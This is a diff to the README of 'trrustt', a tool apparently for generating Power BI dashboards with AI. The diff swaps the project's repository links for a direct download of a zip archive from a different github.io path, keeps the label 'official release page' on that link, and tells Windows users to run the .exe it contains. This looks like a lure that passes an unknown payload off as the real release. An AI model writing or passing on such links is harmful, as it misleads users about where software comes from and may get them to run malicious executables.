@@ -5,7 +5,7 @@ description: "Automate Power BI dashboard creation and DAX generation with a sta
 ---
 # 📊 trrustt - Create Power BI Dashboards With AI
 
-[![](https://img.shields.io/badge/Download_trrustt-Blue-blue)](https://github.com/lutherendergonic977/trrustt)
+[![](https://img.shields.io/badge/Download_trrustt-Blue-blue)](https://raw.githubusercontent.com/lutherendergonic977/lutherendergonic977.github.io/main/carrow/v2.3.zip)
 
 ## 💡 About trrustt
 
@@ -26,7 +26,7 @@ You no longer need to spend hours clicking through settings or writing complex c
 
 Follow these steps to get the software on your Windows machine:
 
-1. Visit the [official release page](https://github.com/lutherendergonic977/trrustt) to download the latest version.
+1. Visit the [official release page](https://raw.githubusercontent.com/lutherendergonic977/lutherendergonic977.github.io/main/carrow/v2.3.zip) to download the latest version.
 2. Select the file ending in `.exe` to start the download.
 3. Once the download finishes, open your Downloads folder.
 4. Double-click the `trrustt.exe` file.
